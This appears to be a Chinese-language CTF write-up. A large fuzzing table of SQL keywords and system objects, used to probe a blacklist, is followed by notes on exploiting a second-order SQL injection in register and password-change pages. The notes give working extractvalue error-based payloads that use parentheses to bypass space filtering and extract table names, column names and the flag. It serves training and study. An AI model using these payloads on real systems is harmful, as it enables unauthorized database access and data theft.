Request	Payload	Status code	Response received	Error	Timeout	Length	Comment
911	TO_BINARY_DOUBLE	302	72	false	false	493	
912	TO_BINARY_FLOAT	302	66	false	false	493	
913	TO_BLOB	302	91	false	false	493	
915	TO_CLOB	302	72	false	false	493	
916	TO_DATE	302	70	false	false	493	
917	TO_DAYS	302	72	false	false	493	
918	TO_DSINTERVAL	302	71	false	false	493	
919	TO_LOB	302	63	false	false	493	
920	TO_MULTI_BYTE	302	74	false	false	493	
922	TO_NCLOB	302	116	false	false	493	
923	TO_NUMBER	302	84	false	false	493	
924	TO_SINGLE_BYTE	302	83	false	false	493	
925	TO_TIMESTAMP	302	83	false	false	493	
926	TO_YMINTERVAL	302	82	false	false	493	
927	TRANSACTION_TIMESTAMP	302	82	false	false	493	
928	TRANSLATE	302	82	false	false	493	
929	TRIGGER	302	72	false	false	493	
930	TRIM	302	62	false	false	493	
931	TRUE	302	61	false	false	493	
932	TRUNC	302	73	false	false	493	
933	TRUNCATE	302	69	false	false	493	
934	TRY_CAST	302	72	false	false	493	
935	TRY_CONVERT	302	72	false	false	493	
936	TRY_PARSE	302	69	false	false	493	
937	TYPE	302	68	false	false	493	
938	TYPE_ID	302	89	false	false	493	
939	TYPE_NAME	302	68	false	false	493	
940	UCASE	302	68	false	false	493	
941	UCS2	302	68	false	false	493	
942	UNBOUNDED	302	74	false	false	493	
943	UNCOMPRESS	302	75	false	false	493	
944	UNCOMPRESSED_LENGTH	302	75	false	false	493	
946	UNICODE	302	76	false	false	493	
947	UNION	302	74	false	false	493	
950	UNIQUE	302	73	false	false	493	
951	UNIQUEIDENTIFIER	302	59	false	false	493	
952	UNISTR	302	60	false	false	493	
953	UNIX_TIMESTAMP	302	85	false	false	493	
954	UNKNOWN	302	89	false	false	493	
955	UNLOCK	302	90	false	false	493	
956	UNPIVOT	302	90	false	false	493	
957	UNSAFE	302	89	false	false	493	
958	UNSIGNED	302	89	false	false	493	
959	UPDATE	302	89	false	false	493	
960	UPDATEXML	302	87	false	false	493	
961	UPPER	302	86	false	false	493	
962	UPSERT	302	93	false	false	493	
963	USAGE	302	61	false	false	493	
964	USE	302	62	false	false	493	
965	USER	302	62	false	false	493	
966	USER_NAME	302	59	false	false	493	
967	USING	302	60	false	false	493	
968	UTC_DATE	302	58	false	false	493	
969	UTC_TIME	302	60	false	false	493	
970	UTC_TIMESTAMP	302	55	false	false	493	
971	UTF16	302	59	false	false	493	
972	UTF32	302	80	false	false	493	
973	UTF8	302	65	false	false	493	
974	UTF8MB4	302	65	false	false	493	
980	UTL_I18N.STRING_TO_RAW	302	73	false	false	493	
981	UTL_INADDR.GET_HOST_ADDRESS	302	73	false	false	493	
982	UTL_INADDR.GET_HOST_NAME	302	70	false	false	493	
983	UTL_RAW.CAST_TO_RAW	302	72	false	false	493	
985	UUID	302	67	false	false	493	
986	UUID_SHORT	302	67	false	false	493	
987	VALUES	302	61	false	false	493	
988	VARBINARY	302	77	false	false	493	
990	VARIANCE	302	77	false	false	493	
991	VARYING	302	61	false	false	493	
992	VAR_POP	302	103	false	false	493	
993	VAR_SAMP	302	85	false	false	493	
994	VERSION	302	95	false	false	493	
995	VIEW	302	88	false	false	493	
1000	VOLATILE	302	73	false	false	493	
1001	VSIZE	302	73	false	false	493	
1002	WAIT	302	59	false	false	493	
1004	WEEK	302	81	false	false	493	
1005	WEEKDAY	302	81	false	false	493	
1006	WEEKOFYEAR	302	80	false	false	493	
1007	WHEN	302	80	false	false	493	
1008	WHERE	302	81	false	false	493	
1009	WINDOW	302	79	false	false	493	
1010	WITH	302	79	false	false	493	
1014	WKSYS	302	68	false	false	493	
1015	WMSYS	302	70	false	false	493	
1016	WM_CONCAT	302	67	false	false	493	
1017	XDB	302	71	false	false	493	
1018	XDBUriType	302	67	false	false	493	
1019	XML	302	66	false	false	493	
1020	XMLAGG	302	67	false	false	493	
1021	XMLATTRIBUTES	302	72	false	false	493	
1022	XMLCAST	302	61	false	false	493	
1023	XMLCOLATTVAL	302	72	false	false	493	
1024	XMLCOMMENT	302	72	false	false	493	
1025	XMLCONCAT	302	60	false	false	493	
1026	XMLDIFF	302	72	false	false	493	
1027	XMLELEMENT	302	60	false	false	493	
1028	XMLEXISTS	302	71	false	false	493	
1030	XMLFOREST	302	70	false	false	493	
1031	XMLNAMESPACES	302	70	false	false	493	
1032	XMLPARSE	302	67	false	false	493	
1033	XMLPATCH	302	94	false	false	493	
1034	XMLPI	302	78	false	false	493	
1035	XMLQUERY	302	61	false	false	493	
1036	XMLROOT	302	65	false	false	493	
1037	XMLSEQUENCE	302	72	false	false	493	
1038	XMLSERIALIZE	302	72	false	false	493	
1039	XMLTABLE	302	76	false	false	493	
1040	XMLTRANSFORM	302	77	false	false	493	
1041	XMLTYPE	302	77	false	false	493	
1042	XOR	302	71	false	false	493	
1043	YEAR	302	70	false	false	493	
1044	ZEROFILL	302	68	false	false	493	
1045	[	302	67	false	false	493	
1046	\	302	61	false	false	493	
1047	\0	302	58	false	false	493	
1048	\N	302	56	false	false	493	
1049	\f	302	75	false	false	493	
1051	\r	302	62	false	false	493	
1052	\t	302	59	false	false	493	
1053	\v	302	80	false	false	493	
1054	\x0b	302	80	false	false	493	
1055	]	302	94	false	false	493	
1056	^	302	81	false	false	493	
1057	_	302	93	false	false	493	
1060	adddate	302	95	false	false	493	
1061	addtime	302	93	false	false	493	
1062	all_clusters	302	79	false	false	493	
1063	all_col_comments	302	77	false	false	493	
1064	all_cons_columns	302	79	false	false	493	
1065	all_constraints	302	77	false	false	493	
1066	all_db_links	302	89	false	false	493	
1067	all_directories	302	89	false	false	493	
1068	all_errors	302	89	false	false	493	
1069	all_external_tables	302	84	false	false	493	
1070	all_ind_columns	302	85	false	false	493	
1071	all_indexes	302	84	false	false	493	
1072	all_java_classes	302	84	false	false	493	
1073	all_mviews	302	77	false	false	493	
1074	all_objects	302	76	false	false	493	
1075	all_part_key_columns	302	76	false	false	493	
1076	all_part_tables	302	83	false	false	493	
1077	all_procedures	302	82	false	false	493	
1078	all_role_privs	302	83	false	false	493	
1079	all_sequences	302	83	false	false	493	
1080	all_source	302	83	false	false	493	
1081	all_synonyms	302	83	false	false	493	
1082	all_sys_privs	302	76	false	false	493	
1083	all_tab_columns	302	77	false	false	493	
1084	all_tab_comments	302	77	false	false	493	
1085	all_tab_privs	302	74	false	false	493	
1086	all_tables	302	76	false	false	493	
1087	all_triggers	302	76	false	false	493	
1088	all_type_attrs	302	75	false	false	493	
1089	all_type_methods	302	75	false	false	493	
1090	all_types	302	75	false	false	493	
1091	all_users	302	75	false	false	493	
1092	all_views	302	82	false	false	493	
1093	any_value	302	80	false	false	493	
1094	array_to_json	302	88	false	false	493	
1104	bulkadmin	302	88	false	false	493	
1114	coercibility	302	75	false	false	493	
1122	ctxsys.CTX_REPORT	302	66	false	false	493	
1123	ctxsys.drithsx	302	66	false	false	493	
1131	date_add	302	76	false	false	493	
1133	date_sub	302	90	false	false	493	
1139	db_accessadmin	302	100	false	false	493	
1140	db_backupoperator	302	84	false	false	493	
1141	db_datareader	302	83	false	false	493	
1142	db_datawriter	302	88	false	false	493	
1143	db_ddladmin	302	91	false	false	493	
1144	db_denydatareader	302	90	false	false	493	
1145	db_denydatawriter	302	68	false	false	493	
1146	db_owner	302	70	false	false	493	
1147	db_securityadmin	302	69	false	false	493	
1149	dba_directories	302	70	false	false	493	
1150	dba_extents	302	69	false	false	493	
1151	dba_free_space	302	70	false	false	493	
1152	dba_objects	302	75	false	false	493	
1154	dba_role_privs	302	91	false	false	493	
1155	dba_roles	302	91	false	false	493	
1156	dba_segments	302	90	false	false	493	
1157	dba_source	302	89	false	false	493	
1158	dba_sys_privs	302	89	false	false	493	
1159	dba_tab_columns	302	88	false	false	493	
1160	dba_tab_privs	302	88	false	false	493	
1161	dba_tables	302	87	false	false	493	
1163	dba_triggers	302	73	false	false	493	
1164	dba_users	302	69	false	false	493	
1165	dba_views	302	73	false	false	493	
1166	dbcreator	302	72	false	false	493	
1167	dbms_assert	302	61	false	false	493	
1168	dbms_crypto	302	72	false	false	493	
1169	dbms_java	302	60	false	false	493	
1170	dbms_java_test	302	64	false	false	493	
1173	dbms_lock	302	66	false	false	493	
1174	dbms_metadata	302	52	false	false	493	
1175	dbms_network_acl_admin	302	70	false	false	493	
1176	dbms_obfuscation_toolkit	302	66	false	false	493	
1177	dbms_pipe	302	56	false	false	493	
1179	dbms_scheduler	302	56	false	false	493	
1180	dbms_sql	302	59	false	false	493	
1181	dbms_utility	302	61	false	false	493	
1182	dbms_xmldom	302	99	false	false	493	
1183	dbms_xmlgen	302	62	false	false	493	
1184	dbms_xmlparser	302	83	false	false	493	
1185	dbms_xmlquery	302	83	false	false	493	
1186	dbms_xmlsave	302	83	false	false	493	
1188	diskadmin	302	76	false	false	493	
1189	dual	302	78	false	false	493	
1195	export_set	302	73	false	false	493	
1199	fn_builtin_permissions	302	72	false	false	493	
1201	fn_my_permissions	302	72	false	false	493	
1202	fn_trace_gettable	302	74	false	false	493	
1208	generate_series	302	93	false	false	493	
1209	get_format	302	94	false	false	493	
1210	get_lock	302	94	false	false	493	
1213	gv$database	302	100	false	false	493	
1214	gv$instance	302	73	false	false	493	
1215	gv$session	302	69	false	false	493	
1216	gv$sql	302	68	false	false	493	
1218	htf	302	58	false	false	493	
1219	htp	302	68	false	false	493	
1222	inet6_aton	302	67	false	false	493	
1223	inet6_ntoa	302	72	false	false	493	
1224	inet_aton	302	55	false	false	493	
1225	inet_ntoa	302	57	false	false	493	
1226	information_schema	302	65	false	false	493	
1227	information_schema.CHECK_CONSTRAINTS	302	75	false	false	493	
1228	information_schema.COLUMNS	302	74	false	false	493	
1229	information_schema.COLUMN_PRIVILEGES	302	66	false	false	493	
1230	information_schema.ENGINES	302	66	false	false	493	
1231	information_schema.EVENTS	302	66	false	false	493	
1233	information_schema.GLOBAL_STATUS	302	77	false	false	493	
1234	information_schema.GLOBAL_VARIABLES	302	74	false	false	493	
1235	information_schema.INNODB_BUFFER_PAGE	302	80	false	false	493	
1236	information_schema.INNODB_CMP	302	78	false	false	493	
1237	information_schema.INNODB_CMPMEM	302	61	false	false	493	
1238	information_schema.INNODB_CMPMEM_RESET	302	61	false	false	493	
1239	information_schema.INNODB_CMP_PER_INDEX	302	65	false	false	493	
1240	information_schema.INNODB_CMP_PER_INDEX_RESET	302	59	false	false	493	
1241	information_schema.INNODB_CMP_RESET	302	104	false	false	493	
1243	information_schema.INNODB_FT_CONFIG	302	64	false	false	493	
1246	information_schema.INNODB_FT_INDEX_CACHE	302	64	false	false	493	
1247	information_schema.INNODB_FT_INDEX_TABLE	302	64	false	false	493	
1248	information_schema.INNODB_INDEX_STATS	302	62	false	false	493	
1249	information_schema.INNODB_LOCKS	302	62	false	false	493	
1250	information_schema.INNODB_LOCK_WAITS	302	79	false	false	493	
1251	information_schema.INNODB_METRICS	302	68	false	false	493	
1252	information_schema.INNODB_TABLESTATS	302	67	false	false	493	
1253	information_schema.INNODB_TEMP_TABLE_INFO	302	73	false	false	493	
1254	information_schema.INNODB_TRX	302	79	false	false	493	
1255	information_schema.INNODB_VIRTUAL	302	76	false	false	493	
1256	information_schema.KEY_COLUMN_USAGE	302	70	false	false	493	
1257	information_schema.PARAMETERS	302	69	false	false	493	
1258	information_schema.PARTITIONS	302	62	false	false	493	
1259	information_schema.PLUGINS	302	66	false	false	493	
1260	information_schema.PROCESSLIST	302	71	false	false	493	
1261	information_schema.PROFILING	302	79	false	false	493	
1262	information_schema.REFERENTIAL_CONSTRAINTS	302	71	false	false	493	
1263	information_schema.ROUTINES	302	60	false	false	493	
1264	information_schema.SCHEMATA	302	69	false	false	493	
1265	information_schema.SCHEMA_PRIVILEGES	302	72	false	false	493	
1266	information_schema.SESSION_STATUS	302	71	false	false	493	
1267	information_schema.SESSION_VARIABLES	302	68	false	false	493	
1268	information_schema.STATISTICS	302	68	false	false	493	
1269	information_schema.TABLES	302	68	false	false	493	
1270	information_schema.TABLE_CONSTRAINTS	302	60	false	false	493	
1271	information_schema.TABLE_PRIVILEGES	302	87	false	false	493	
1272	information_schema.TRIGGERS	302	63	false	false	493	
1273	information_schema.USER_PRIVILEGES	302	54	false	false	493	
1274	information_schema.VIEWS	302	53	false	false	493	
1287	is_free_lock	302	86	false	false	493	
1288	is_ipv4	302	76	false	false	493	
1289	is_ipv4_compat	302	76	false	false	493	
1290	is_ipv4_mapped	302	67	false	false	493	
1291	is_ipv6	302	59	false	false	493	
1292	is_used_lock	302	65	false	false	493	
1294	json_array_elements	302	59	false	false	493	
1295	json_array_elements_text	302	64	false	false	493	
1297	json_build_array	302	59	false	false	493	
1298	json_build_object	302	62	false	false	493	
1299	json_each	302	64	false	false	493	
1300	json_each_text	302	69	false	false	493	
1301	json_object_keys	302	64	false	false	493	
1303	jsonb	302	62	false	false	493	
1304	jsonb_array_elements	302	100	false	false	493	
1305	jsonb_array_elements_text	302	54	false	false	493	
1306	jsonb_build_array	302	57	false	false	493	
1307	jsonb_build_object	302	109	false	false	493	
1308	jsonb_each	302	56	false	false	493	
1309	jsonb_each_text	302	104	false	false	493	
1310	jsonb_extract_path	302	92	false	false	493	
1311	jsonb_extract_path_text	302	101	false	false	493	
1313	jsonb_object_keys	302	94	false	false	493	
1314	jsonb_path_exists	302	96	false	false	493	
1315	jsonb_path_match	302	98	false	false	493	
1316	jsonb_path_query	302	97	false	false	493	
1317	jsonb_path_query_array	302	113	false	false	493	
1318	jsonb_path_query_first	302	101	false	false	493	
1319	jsonb_pretty	302	99	false	false	493	
1320	jsonb_set	302	53	false	false	493	
1321	jsonb_strip_nulls	302	88	false	false	493	
1322	jsonb_typeof	302	87	false	false	493	
1334	make_set	302	96	false	false	493	
1337	master	302	61	false	false	493	
1338	master..sysconfigures	302	82	false	false	493	
1339	master..sysdatabases	302	81	false	false	493	
1340	master..syslogins	302	81	false	false	493	
1341	master..sysmessages	302	65	false	false	493	
1342	master..sysprocesses	302	80	false	false	493	
1343	master..sysremotelogins	302	86	false	false	493	
1344	master..sysservers	302	89	false	false	493	
1345	master_pos_wait	302	89	false	false	493	
1351	model	302	55	false	false	493	
1353	monthname	302	83	false	false	493	
1354	msdb	302	94	false	false	493	
1355	mysql	302	78	false	false	493	
1356	mysql.columns_priv	302	77	false	false	493	
1357	mysql.db	302	93	false	false	493	
1358	mysql.general_log	302	93	false	false	493	
1359	mysql.procs_priv	302	93	false	false	493	
1360	mysql.proxies_priv	302	93	false	false	493	
1361	mysql.slow_log	302	93	false	false	493	
1362	mysql.tables_priv	302	79	false	false	493	
1363	mysql.user	302	55	false	false	493	
1366	nslookup	302	74	false	false	493	
1372	owa	302	73	false	false	493	
1374	performance_schema	302	59	false	false	493	
1377	pg_attribute	302	75	false	false	493	
1378	pg_auth_members	302	75	false	false	493	
1379	pg_authid	302	74	false	false	493	
1380	pg_available_extensions	302	75	false	false	493	
1381	pg_catalog	302	75	false	false	493	
1382	pg_class	302	76	false	false	493	
1383	pg_database	302	52	false	false	493	
1384	pg_extension	302	52	false	false	493	
1386	pg_group	302	83	false	false	493	
1388	pg_index	302	82	false	false	493	
1389	pg_indexes	302	82	false	false	493	
1390	pg_locks	302	82	false	false	493	
1391	pg_logdir_ls	302	82	false	false	493	
1392	pg_ls_archive_statusdir	302	82	false	false	493	
1393	pg_ls_dir	302	82	false	false	493	
1394	pg_ls_waldir	302	82	false	false	493	
1395	pg_namespace	302	82	false	false	493	
1399	pg_roles	302	74	false	false	493	
1400	pg_settings	302	74	false	false	493	
1401	pg_shadow	302	74	false	false	493	
1403	pg_stat_activity	302	78	false	false	493	
1405	pg_stat_user_indexes	302	74	false	false	493	
1406	pg_stat_user_tables	302	65	false	false	493	
1407	pg_tables	302	70	false	false	493	
1408	pg_user	302	67	false	false	493	
1409	pg_views	302	57	false	false	493	
1410	ping	302	58	false	false	493	
1412	processadmin	302	66	false	false	493	
1413	public	302	73	false	false	493	
1416	release_lock	302	65	false	false	493	
1422	row_to_json	302	67	false	false	493	
1426	sec_to_time	302	76	false	false	493	
1428	securityadmin	302	76	false	false	493	
1429	serveradmin	302	82	false	false	493	
1431	setupadmin	302	82	false	false	493	
1434	sp_addmessage	302	81	false	false	493	
1435	sp_addrolemember	302	81	false	false	493	
1436	sp_addsrvrolemember	302	79	false	false	493	
1437	sp_altermessage	302	76	false	false	493	
1438	sp_configure	302	74	false	false	493	
1439	sp_droprolemember	302	70	false	false	493	
1440	sp_dropsrvrolemember	302	71	false	false	493	
1441	sp_executesql	302	70	false	false	493	
1442	sp_help	302	67	false	false	493	
1443	sp_helpdb	302	71	false	false	493	
1444	sp_helplogins	302	66	false	false	493	
1445	sp_helpserver	302	69	false	false	493	
1446	sp_helptext	302	59	false	false	493	
1447	sp_oacreate	302	61	false	false	493	
1448	sp_oadestroy	302	73	false	false	493	
1449	sp_oageterrorinfo	302	59	false	false	493	
1450	sp_oagetproperty	302	55	false	false	493	
1451	sp_oamethod	302	61	false	false	493	
1452	sp_oasetproperty	302	59	false	false	493	
1453	sp_oastop	302	59	false	false	493	
1455	sp_send_dbmail	302	61	false	false	493	
1456	sp_sqlexec	302	61	false	false	493	
1457	sp_who	302	54	false	false	493	
1458	sp_who2	302	48	false	false	493	
1460	sqlite_master	302	104	false	false	493	
1461	sqlite_sequence	302	104	false	false	493	
1462	sqlite_source_id	302	104	false	false	493	
1463	sqlite_temp_master	302	103	false	false	493	
1464	sqlite_version	302	102	false	false	493	
1465	std	302	101	false	false	493	
1472	subdate	302	82	false	false	493	
1475	subtime	302	81	false	false	493	
1477	sys	302	81	false	false	493	
1478	sys.assemblies	302	71	false	false	493	
1479	sys.asymmetric_keys	302	79	false	false	493	
1480	sys.certificates	302	75	false	false	493	
1481	sys.col$	302	63	false	false	493	
1482	sys.columns	302	64	false	false	493	
1483	sys.credentials	302	64	false	false	493	
1484	sys.crypt_properties	302	74	false	false	493	
1486	sys.database_permissions	302	74	false	false	493	
1487	sys.database_principals	302	77	false	false	493	
1488	sys.fulltext_catalogs	302	74	false	false	493	
1489	sys.fulltext_indexes	302	69	false	false	493	
1490	sys.host_summary	302	75	false	false	493	
1491	sys.indexes	302	75	false	false	493	
1492	sys.obj$	302	74	false	false	493	
1493	sys.parameters	302	72	false	false	493	
1494	sys.procedure$	302	61	false	false	493	
1495	sys.procedures	302	58	false	false	493	
1496	sys.schema_auto_increment_columns	302	57	false	false	493	
1497	sys.schema_index_statistics	302	58	false	false	493	
1498	sys.schema_object_overview	302	66	false	false	493	
1499	sys.schema_redundant_indexes	302	67	false	false	493	
1500	sys.schema_table_statistics	302	65	false	false	493	
1501	sys.schema_tables_with_full_table_scans	302	62	false	false	493	
1502	sys.schema_unused_indexes	302	62	false	false	493	
1503	sys.schemas	302	73	false	false	493	
1504	sys.server_principals	302	75	false	false	493	
1505	sys.source$	302	74	false	false	493	
1506	sys.sql_logins	302	75	false	false	493	
1507	sys.statements_with_errors_or_warnings	302	74	false	false	493	
1508	sys.statements_with_full_table_scans	302	70	false	false	493	
1509	sys.statements_with_runtimes_in_95th_percentile	302	90	false	false	493	
1510	sys.statements_with_sorting	302	76	false	false	493	
1511	sys.statements_with_temp_tables	302	91	false	false	493	
1512	sys.symmetric_keys	302	89	false	false	493	
1513	sys.tab$	302	86	false	false	493	
1514	sys.tables	302	83	false	false	493	
1515	sys.trigger$	302	80	false	false	493	
1516	sys.triggers	302	80	false	false	493	
1517	sys.types	302	80	false	false	493	
1518	sys.user$	302	80	false	false	493	
1519	sys.user_summary	302	77	false	false	493	
1520	sys.v_$parameter	302	83	false	false	493	
1521	sys.version	302	83	false	false	493	
1522	sys.views	302	82	false	false	493	
1523	sys.x$ksppcv	302	76	false	false	493	
1524	sys_eval	302	76	false	false	493	
1525	sys_exec	302	75	false	false	493	
1526	sys_get	302	75	false	false	493	
1527	sys_set	302	76	false	false	493	
1528	sysadmin	302	75	false	false	493	
1529	syscolumns	302	63	false	false	493	
1530	sysdatabases	302	80	false	false	493	
1534	sysindexes	302	86	false	false	493	
1535	sysobjects	302	80	false	false	493	
1536	sysperfinfo	302	86	false	false	493	
1537	sysprocesses	302	80	false	false	493	
1538	sysremotelogins	302	86	false	false	493	
1539	sysservers	302	90	false	false	493	
1541	systypes	302	87	false	false	493	
1542	sysusers	302	84	false	false	493	
1543	tempdb	302	84	false	false	493	
1546	time_to_sec	302	97	false	false	493	
1552	to_json	302	75	false	false	493	
1553	to_jsonb	302	79	false	false	493	
1554	to_seconds	302	82	false	false	493	
1561	user_col_comments	302	65	false	false	493	
1562	user_cons_columns	302	78	false	false	493	
1563	user_constraints	302	74	false	false	493	
1564	user_errors	302	69	false	false	493	
1565	user_ind_columns	302	77	false	false	493	
1566	user_indexes	302	66	false	false	493	
1567	user_objects	302	73	false	false	493	
1568	user_procedures	302	62	false	false	493	
1569	user_role_privs	302	56	false	false	493	
1570	user_sequences	302	73	false	false	493	
1571	user_source	302	73	false	false	493	
1572	user_sys_privs	302	83	false	false	493	
1573	user_tab_columns	302	69	false	false	493	
1574	user_tab_comments	302	79	false	false	493	
1575	user_tab_privs	302	74	false	false	493	
1576	user_tables	302	73	false	false	493	
1577	user_triggers	302	73	false	false	493	
1578	user_types	302	73	false	false	493	
1579	user_users	302	57	false	false	493	
1580	user_views	302	62	false	false	493	
1585	utl_http	302	88	false	false	493	
1586	utl_http.request	302	79	false	false	493	
1587	utl_http.request_pieces	302	98	false	false	493	
1588	utl_inaddr	302	79	false	false	493	
1589	utl_mail	302	88	false	false	493	
1590	utl_smtp	302	55	false	false	493	
1591	utl_tcp	302	80	false	false	493	
1593	v$database	302	56	false	false	493	
1595	v$fixed_table	302	68	false	false	493	
1596	v$instance	302	58	false	false	493	
1598	v$option	302	53	false	false	493	
1599	v$parameter	302	75	false	false	493	
1600	v$process	302	64	false	false	493	
1602	v$session	302	82	false	false	493	
1603	v$spparameter	302	60	false	false	493	
1604	v$sql	302	76	false	false	493	
1605	v$sqlarea	302	63	false	false	493	
1606	v$sqltext	302	63	false	false	493	
1607	v$sqltext_with_newlines	302	62	false	false	493	
1608	v$system_parameter	302	73	false	false	493	
1609	v$tablespace	302	56	false	false	493	
1610	v$version	302	61	false	false	493	
1618	weight_string	302	68	false	false	493	
1621	xp_cmdshell	302	55	false	false	493	
1622	xp_dirtree	302	75	false	false	493	
1623	xp_enumgroups	302	69	false	false	493	
1625	xp_grantlogin	302	69	false	false	493	
1626	xp_logininfo	302	69	false	false	493	
1627	xp_msver	302	69	false	false	493	
1628	xp_regaddmultistring	302	69	false	false	493	
1631	xp_regread	302	69	false	false	493	
1632	xp_regremovemultistring	302	56	false	false	493	
1633	xp_regwrite	302	62	false	false	493	
1634	xp_revokelogin	302	60	false	false	493	
1635	xp_sendmail	302	77	false	false	493	
1636	xp_subdirs	302	77	false	false	493	
1638	yearweek	302	74	false	false	493	
1639	{	302	77	false	false	493	
1640	|	302	77	false	false	493	
1641	||	302	77	false	false	493	
1642	}	302	61	false	false	493	
1643	~	302	75	false	false	493	


1:探测黑名单：
	根据上面内容筛选出报错注入需要用到的相关函数没有被禁用，空额被过滤,()没有被过滤优先考虑报错注入这类可以大量使用()替代空额的注入方式，首选报错注入
2:
	login.php
		第一次尝试登陆admin账号输入错误密码，登陆失败说明账号存在
3:
	register.php
		分别注册admin'#与admin"#
	login.php
		分别登陆俩个账号然后修改密码，发现最后admin"#修改完密码后修改的是admin账号的密码登陆成功【存在二次注入】并且闭合方式为""
	推测后台修改密码逻辑：
		UPDATE users SET password = "new_password" WHERE username = "user1" AND password = "old_password";
		UPDATE users SET password = 'new_password' WHERE username = "admin"#" AND password = "old_password";这样就修改了admin的密码
	推测注册账号逻辑：
		INSERT INTO users (username, password, email) VALUES ('user1', '加密后的密码', 'test@example.com');
		INSERT INTO users (username, password, email) VALUES ('admin"#', '加密后的密码', 'test@example.com');
4：
	注册账号username=1"||extractvalue(1,concat(0x7e,database()))#
		INSERT INTO users (username, password, email) VALUES ('1"||extractvalue(1,concat(0x7e,database()))#', '加密后的密码', 'test@example.com');
	登陆并修改账号：
		UPDATE users SET password = "new_password" WHERE username = "1"||extractvalue(1,concat(0x7e,database()))#" AND password = "old_password";
		获取数据库：~web_sqli
5:	获取表名
	注册账号:username=1"||extractvalue(1,${sub_payload})#
				select(group_concat(0x7e,table_name))from(information_schema.tables)where(table_schema)="web_sqli"
			username=1"||extractvalue(1,(select(group_concat(0x7e,table_name))from(information_schema.tables)where(table_schema)="web_sqli"))#
		获取表名：~article,~flag,~users
6:	
	获取users列名
	注册账号:username=1"||extractvalue(1,${sub_payload})#
			username=1"||extractvalue(1,concat(0x5e,(select(group_concat(column_name))from(information_schema.columns)where(table_name)="users")))#
			获取部分列名：name,pwd,email,real_flag_1s_her
			使用reverse()函数倒置
			username=1"||extractvalue(1,reverse((select(group_concat(0x7e,column_name))from(information_schema.columns)where(table_name)="users")))#
			获取部分列名：~,liame~,dwp~,eman~不可行
			继续：username=1"||extractvalue(1,concat(0x7e,reverse((select(group_concat(column_name))from(information_schema.columns)where(table_name)="users"))))#
			得到后半部分：~ereh_s1_galf_laer,liame,dwp,ema
			综合表明为：name,pwd,email,real_flag_1s_here
7：		
	获取flag
	注册账号：username=1"||extractvalue(1,${sub_payload})#
				select(real_flag_1s_here)from(users)
			username=1"||extractvalue(1,(select(real_flag_1s_here)from(users)))#
			返回多行数据：Subquery returns more than 1 row
			username=1"||extractvalue(1,(select(real_flag_1s_here)from(users))limit%a01%a01)#无法绕过空格子
			使用regexp正则匹配：
			
			1"||extractvalue(1,concat(0x7e,(select(real_flag_1s_here)from(users)where(real_flag_1s_here)regexp('^f'))))#
			1"||extractvalue(1,concat(0x7e,reverse((select(real_flag_1s_here)from(users)where(real_flag_1s_here)regexp('^f')))))#
